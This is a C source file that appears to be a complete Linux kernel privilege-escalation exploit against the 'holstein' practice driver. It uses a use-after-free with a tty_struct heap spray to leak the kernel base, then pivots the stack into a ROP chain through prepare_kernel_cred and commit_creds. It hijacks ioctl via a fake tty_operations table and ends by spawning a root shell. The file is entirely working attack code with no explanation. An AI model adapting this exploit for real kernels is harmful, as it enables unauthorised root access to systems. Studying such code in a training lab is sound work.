#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define ofs_tty_ops 0xc39c60
#define spray_num 100
#define dev_vuln "/dev/holstein"
#define prepare_kernel_cred (kbase + 0x72560)
#define commit_creds (kbase + 0x723c0)
#define pop_rdi_ret (kbase + 0x14078a)
#define pop_rcx_ret (kbase + 0x0eb7e4)
#define push_rdx_pop_rsp_pop_ret (kbase + 0x14fbea)
#define mov_rdi_rax_rep_movsq_ret (kbase + 0x638e9b)
#define swapgs_restore_regs_and_return_to_usermode (kbase + 0x800e26)

void spawn_shell();
u64 user_rip = (u64)spawn_shell + 1;
u64 user_cs, user_ss, user_rflags, user_sp;
u64 kbase;
u64 g_buf;
i32 spray[spray_num];

char buf[0x500];
void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  system("/bin/sh");
  exit(0);
}
void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}
void fatal(char *msg) {
  perror(msg);
  exit(-1);
}
int main() {
  save_userland_state();
  int spray[100];
  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  close(fd1);
  puts("spayinggg !!!");
  for (int i = 0; i < spray_num / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      fatal("cuts");
    }
  }
  puts("prepare leak!!!");
  read(fd2, buf, 0x400); // read tty_struct
  kbase = *(u64 *)&buf[0x18] - ofs_tty_ops;
  g_buf = *(u64 *)&buf[0x38] - 0x38;
  printf("[+] kbase: 0x%lx\n", kbase);
  printf("[+] gbuf: 0x%lx\n", g_buf);
  printf("preparing rop chain \n");

  u64 *p = (u64 *)&buf;

  *p++ = pop_rdi_ret;
  *p++ = 0x0;
  *p++ = prepare_kernel_cred;
  *p++ = pop_rcx_ret;
  *p++ = 0;
  *p++ = mov_rdi_rax_rep_movsq_ret;
  *p++ = commit_creds;
  *p++ = pop_rcx_ret;
  *p++ = 0;
  *p++ = pop_rcx_ret;
  *p++ = 0;
  *p++ = swapgs_restore_regs_and_return_to_usermode;
  *p++ = 0x0;
  *p++ = 0x0;
  *p++ = user_rip;
  *p++ = user_cs;
  *p++ = user_rflags;
  *p++ = user_sp;
  *p++ = user_ss;

  *(u64 *)&buf[0x3f8] = push_rdx_pop_rsp_pop_ret;
  printf("overwriting tty_struct -> rop chain and fake ioctl\n");
  write(fd2, buf, 0x400);

  puts("uaf2");
  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 < 1 || fd4 < 1) {
    fatal("cuts");
  }
  close(fd3);
  puts("spraying uaf2");
  for (int i = spray_num / 2; i < spray_num; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      fatal("cuts");
    }
  }
  puts("overwriting tty_struct with fake tty_ops");
  read(fd4, buf, 0x400);
  *(u64 *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
  write(fd4, buf, 0x20);
  puts("hijack ioctl");
  for (int i = spray_num / 2; i < spray_num; i++) {
    ioctl(spray[i], 0, g_buf - 8);
  }
  close(fd2);
  close(fd4);

  for (int i = 0; i < spray_num; i++) {
    close(spray[i]);
  }
  return 0;
}